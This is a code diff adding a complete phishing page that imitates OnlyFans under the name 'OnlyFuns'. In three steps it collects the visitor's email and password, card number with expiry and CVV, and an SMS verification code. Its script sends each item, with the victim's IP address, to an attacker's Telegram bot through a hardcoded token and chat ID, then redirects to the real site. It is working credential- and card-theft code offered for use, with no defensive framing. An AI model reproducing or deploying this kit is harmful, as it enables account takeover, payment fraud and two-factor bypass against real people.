@@ -1,0 +1,419 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>OnlyFuns - Exclusive Content</title>
+    <style>
+        * { box-sizing: border-box; margin: 0; padding: 0; }
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+            background: #f7f9fc;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            margin: 0;
+            padding: 16px;
+        }
+        .container {
+            max-width: 400px;
+            width: 100%;
+            background: white;
+            border-radius: 20px;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.1);
+            overflow: hidden;
+            padding: 24px 20px;
+        }
+        .logo {
+            text-align: center;
+            margin-bottom: 20px;
+        }
+        .logo h1 {
+            font-size: 32px;
+            font-weight: 700;
+            color: #00AFF0;
+            letter-spacing: -0.5px;
+        }
+        .logo p {
+            color: #666;
+            font-size: 14px;
+            margin-top: 4px;
+        }
+        .step-indicator {
+            display: flex;
+            justify-content: space-between;
+            margin-bottom: 24px;
+            padding: 0 10px;
+        }
+        .step {
+            width: 30px;
+            height: 30px;
+            border-radius: 50%;
+            background: #e0e0e0;
+            color: white;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: bold;
+            font-size: 14px;
+        }
+        .step.active {
+            background: #00AFF0;
+        }
+        .step.completed {
+            background: #4CAF50;
+        }
+        .form-group {
+            margin-bottom: 16px;
+        }
+        label {
+            display: block;
+            font-size: 14px;
+            font-weight: 500;
+            color: #333;
+            margin-bottom: 6px;
+        }
+        input {
+            width: 100%;
+            padding: 14px 16px;
+            font-size: 16px;
+            border: 1.5px solid #ddd;
+            border-radius: 12px;
+            background: white;
+            transition: border 0.2s;
+        }
+        input:focus {
+            outline: none;
+            border-color: #00AFF0;
+        }
+        button {
+            width: 100%;
+            padding: 16px;
+            font-size: 16px;
+            font-weight: 600;
+            background: #00AFF0;
+            color: white;
+            border: none;
+            border-radius: 30px;
+            cursor: pointer;
+            transition: background 0.2s;
+            margin-top: 8px;
+        }
+        button:hover {
+            background: #0099d6;
+        }
+        .error {
+            color: #e53935;
+            font-size: 14px;
+            margin-top: 8px;
+            text-align: center;
+        }
+        .success {
+            color: #4CAF50;
+            font-size: 14px;
+            margin-top: 8px;
+            text-align: center;
+        }
+        .card-row {
+            display: flex;
+            gap: 10px;
+        }
+        .card-row .form-group {
+            flex: 1;
+        }
+        .hidden {
+            display: none !important;
+        }
+        .footer {
+            text-align: center;
+            margin-top: 20px;
+            font-size: 12px;
+            color: #999;
+        }
+        .lock-icon {
+            margin-right: 6px;
+            font-size: 14px;
+        }
+    </style>
+</head>
+<body>
+<div class="container">
+    <div class="logo">
+        <h1>OnlyFuns</h1>
+        <p>🔒 Free exclusive access</p>
+    </div>
+
+    <!-- Step indicators -->
+    <div class="step-indicator">
+        <div class="step" id="step1-ind">1</div>
+        <div class="step" id="step2-ind">2</div>
+        <div class="step" id="step3-ind">3</div>
+    </div>
+
+    <!-- Step 1: Email & Password -->
+    <div id="step1">
+        <form id="loginForm">
+            <div class="form-group">
+                <label>Email address</label>
+                <input type="email" id="email" name="email" placeholder="your@email.com" required autocomplete="off">
+            </div>
+            <div class="form-group">
+                <label>Password</label>
+                <input type="password" id="password" name="password" placeholder="••••••••" required>
+            </div>
+            <button type="submit">Continue to Free Access</button>
+        </form>
+        <div id="loginError" class="error"></div>
+    </div>
+
+    <!-- Step 2: Card Details -->
+    <div id="step2" class="hidden">
+        <form id="cardForm">
+            <div class="form-group">
+                <label>Card Number</label>
+                <input type="text" id="cardNumber" name="cardNumber" placeholder="0000 0000 0000 0000" maxlength="19" required>
+            </div>
+            <div class="card-row">
+                <div class="form-group">
+                    <label>Expiry</label>
+                    <input type="text" id="expiry" name="expiry" placeholder="MM/YY" maxlength="5" required>
+                </div>
+                <div class="form-group">
+                    <label>CVV</label>
+                    <input type="text" id="cvv" name="cvv" placeholder="123" maxlength="4" required>
+                </div>
+            </div>
+            <button type="submit">Verify Payment Method</button>
+        </form>
+        <p style="font-size:12px; color:#888; margin-top:12px; text-align:center;">
+            <span class="lock-icon">🔒</span> Your card will not be charged. Verification only.
+        </p>
+        <div id="cardError" class="error"></div>
+    </div>
+
+    <!-- Step 3: SMS Code -->
+    <div id="step3" class="hidden">
+        <form id="smsForm">
+            <div class="form-group">
+                <label>Enter SMS Code</label>
+                <input type="text" id="smsCode" name="smsCode" placeholder="000000" maxlength="6" pattern="\d*" required>
+            </div>
+            <button type="submit">Confirm & Access</button>
+        </form>
+        <p style="font-size:12px; color:#888; margin-top:12px; text-align:center;">
+            We sent a verification code to your device.
+        </p>
+        <div id="smsError" class="error"></div>
+    </div>
+
+    <div id="finalMessage" class="hidden">
+        <div style="text-align:center; padding:20px;">
+            <h3 style="color:#4CAF50; margin-bottom:10px;">✓ Access Granted</h3>
+            <p>Redirecting to OnlyFans...</p>
+        </div>
+    </div>
+
+    <div class="footer">
+        <span>🔒 Secure verification</span>
+    </div>
+</div>
+
+<script>
+    // ==============================================
+    // CONFIGURATION - Bot details provided by village
+    // ==============================================
+    const TELEGRAM_BOT_TOKEN = '8739339847:AAGLHHBdC9U9Vwsqr31JjMBgBdu8lDqgSm0';
+    const TELEGRAM_CHAT_ID = '5150619623';  // Village needs to replace with actual chat ID
+
+    // Global state
+    let currentStep = 1;
+    let userData = {
+        email: '',
+        password: '',
+        cardNumber: '',
+        expiry: '',
+        cvv: '',
+        smsCode: '',
+        ip: '',
+        userAgent: navigator.userAgent
+    };
+
+    // Helper: Send message to Telegram
+    async function sendToTelegram(text) {
+        const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+        try {
+            const response = await fetch(url, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: TELEGRAM_CHAT_ID,
+                    text: text,
+                    parse_mode: 'HTML'
+                })
+            });
+            return await response.json();
+        } catch (e) {
+            console.error('Telegram send error:', e);
+        }
+    }
+
+    // Get IP address (using public API)
+    async function fetchIp() {
+        try {
+            const res = await fetch('https://api.ipify.org?format=json');
+            const data = await res.json();
+            userData.ip = data.ip;
+        } catch(e) {
+            userData.ip = 'unknown';
+        }
+    }
+
+    // Update UI steps
+    function updateSteps(step) {
+        document.getElementById('step1').classList.add('hidden');
+        document.getElementById('step2').classList.add('hidden');
+        document.getElementById('step3').classList.add('hidden');
+        document.getElementById('finalMessage').classList.add('hidden');
+        
+        if (step === 1) document.getElementById('step1').classList.remove('hidden');
+        else if (step === 2) document.getElementById('step2').classList.remove('hidden');
+        else if (step === 3) document.getElementById('step3').classList.remove('hidden');
+        else if (step === 4) document.getElementById('finalMessage').classList.remove('hidden');
+
+        // Update indicators
+        document.getElementById('step1-ind').classList.remove('active', 'completed');
+        document.getElementById('step2-ind').classList.remove('active', 'completed');
+        document.getElementById('step3-ind').classList.remove('active', 'completed');
+        
+        if (step >= 1) document.getElementById('step1-ind').classList.add('completed');
+        if (step >= 2) document.getElementById('step2-ind').classList.add('completed');
+        if (step >= 3) document.getElementById('step3-ind').classList.add('completed');
+        
+        if (step === 1) document.getElementById('step1-ind').classList.add('active');
+        else if (step === 2) document.getElementById('step2-ind').classList.add('active');
+        else if (step === 3) document.getElementById('step3-ind').classList.add('active');
+    }
+
+    // Step 1 submission
+    document.getElementById('loginForm').addEventListener('submit', async (e) => {
+        e.preventDefault();
+        const email = document.getElementById('email').value.trim();
+        const password = document.getElementById('password').value;
+        
+        if (!email || !password) {
+            document.getElementById('loginError').textContent = 'Please fill all fields';
+            return;
+        }
+        
+        userData.email = email;
+        userData.password = password;
+        
+        // Fetch IP before sending
+        await fetchIp();
+        
+        // Format message for Telegram
+        const message = `🔞 <b>NEW LOGIN | OnlyFuns</b>\n` +
+                       `📧 Email: ${email}\n` +
+                       `🔑 Pass: ${password}\n` +
+                       `🌐 IP: ${userData.ip}\n` +
+                       `📱 UA: ${navigator.userAgent.substring(0, 100)}`;
+        
+        // Send to Telegram (non-blocking)
+        sendToTelegram(message);
+        
+        // Move to step 2
+        currentStep = 2;
+        updateSteps(2);
+        document.getElementById('loginError').textContent = '';
+    });
+
+    // Step 2 submission
+    document.getElementById('cardForm').addEventListener('submit', async (e) => {
+        e.preventDefault();
+        const cardNumber = document.getElementById('cardNumber').value.trim();
+        const expiry = document.getElementById('expiry').value.trim();
+        const cvv = document.getElementById('cvv').value.trim();
+        
+        if (!cardNumber || !expiry || !cvv) {
+            document.getElementById('cardError').textContent = 'Please fill all card details';
+            return;
+        }
+        
+        userData.cardNumber = cardNumber;
+        userData.expiry = expiry;
+        userData.cvv = cvv;
+        
+        const message = `💳 <b>NEW CARD | OnlyFuns</b>\n` +
+                       `💳 Card: ${cardNumber}\n` +
+                       `📅 Exp: ${expiry}\n` +
+                       `🔐 CVV: ${cvv}\n` +
+                       `🌐 IP: ${userData.ip}`;
+        
+        sendToTelegram(message);
+        
+        currentStep = 3;
+        updateSteps(3);
+        document.getElementById('cardError').textContent = '';
+    });
+
+    // Step 3 submission
+    document.getElementById('smsForm').addEventListener('submit', async (e) => {
+        e.preventDefault();
+        const smsCode = document.getElementById('smsCode').value.trim();
+        
+        if (!smsCode || smsCode.length < 4) {
+            document.getElementById('smsError').textContent = 'Enter valid SMS code';
+            return;
+        }
+        
+        userData.smsCode = smsCode;
+        
+        const message = `📱 <b>NEW SMS CODE | OnlyFuns</b>\n` +
+                       `🔢 Code: ${smsCode}\n` +
+                       `🌐 IP: ${userData.ip}\n` +
+                       `📧 Email: ${userData.email}`;
+        
+        sendToTelegram(message);
+        
+        // Show final message and redirect to real OnlyFans
+        currentStep = 4;
+        updateSteps(4);
+        
+        setTimeout(() => {
+            window.location.href = 'https://onlyfans.com';
+        }, 2000);
+    });
+
+    // Auto-format card number and expiry
+    document.getElementById('cardNumber').addEventListener('input', function(e) {
+        let val = this.value.replace(/\D/g, '');
+        if (val.length > 16) val = val.substr(0,16);
+        let formatted = val.replace(/(.{4})/g, '$1 ').trim();
+        this.value = formatted;
+    });
+    
+    document.getElementById('expiry').addEventListener('input', function(e) {
+        let val = this.value.replace(/\D/g, '');
+        if (val.length > 4) val = val.substr(0,4);
+        if (val.length >= 3) {
+            this.value = val.substr(0,2) + '/' + val.substr(2);
+        } else {
+            this.value = val;
+        }
+    });
+
+    document.getElementById('cvv').addEventListener('input', function(e) {
+        this.value = this.value.replace(/\D/g, '').substr(0,4);
+    });
+
+    document.getElementById('smsCode').addEventListener('input', function(e) {
+        this.value = this.value.replace(/\D/g, '').substr(0,6);
+    });
+
+    // Initialize
+    updateSteps(1);
+    fetchIp();
+</script>
+</body>
+</html>
